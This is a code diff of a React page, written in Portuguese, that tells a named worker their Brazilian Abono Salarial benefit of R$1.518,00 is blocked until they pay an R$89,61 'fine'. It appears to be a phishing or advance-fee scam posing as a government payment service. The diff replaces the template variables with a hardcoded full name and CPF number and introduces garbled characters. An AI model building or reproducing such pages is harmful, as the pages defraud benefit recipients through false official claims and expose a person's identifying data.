@@ -1,4 +1,3 @@
-
 import React, { useEffect, useState, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import { Button } from "@/components/ui/button";
@@ -473,7 +472,7 @@ const UserData: React.FC = () => {
                         <Separator className="my-1" />
                         <div className="flex flex-col">
                           <span className="text-xs text-gray-500">Situação do Pagamento</span>
-                          <span className="text-sm font-medium text-red-600">Aguardando Regularização de 1 Impedimento</span>
+                          <span className="text-sm font-medium text-red-600">Aguardando Regulariza��ão de 1 Impedimento</span>
                         </div>
                         <Separator className="my-1" />
                         <div className="flex flex-col">
@@ -549,7 +548,7 @@ const UserData: React.FC = () => {
                         
                         <Alert className="bg-red-100 border-red-400 border-2 p-3 rounded-md">
                           <AlertDescription className="text-xs font-medium text-red-800">
-                            Informamos que o trabalhista {userData.nome} portador do CPF {userData.cpf}, tem 1 Impedimento para o recebimento do Abono Salarial no valor de R$1.518,00. Para a liberação do valor do Abono Salarial será necessário pagar a multa aplicada com base no Impedimento "O Trabalhista não enviou a declaração RAIS/eSocial" no valor de R$63,21 + R$6,60 por trimestre atrasado, totalizando R$89,61. Clique no botão abaixo para regularizar seu Abono Salarial e liberar o pagamento de R$1.518,00 diretamente em sua conta após o pagamento da multa!
+                            Informamos que o trabalhista THEISON RAONE SCHULZ ROSS portador do CPF 17805087784, tem 1 Impedimento para o recebimento do Abono Salarial no valor de R$1.518,00. Para a liberação do valor do Abono Salarial será necessário pagar a multa aplicada com base no Impedimento "O Trabalhista não enviou a declaração RAIS/eSocial" no valor de R$63,21 + R$6,60 por trimestre atrasado, totalizando R$89,61. Clique no botão abaixo para regularizar seu Abono Salarial e liberar o pagamento de R$1.518,00 diretamente em sua conta após o pagamento da multa!
                           </AlertDescription>
                         </Alert>
                       </div>
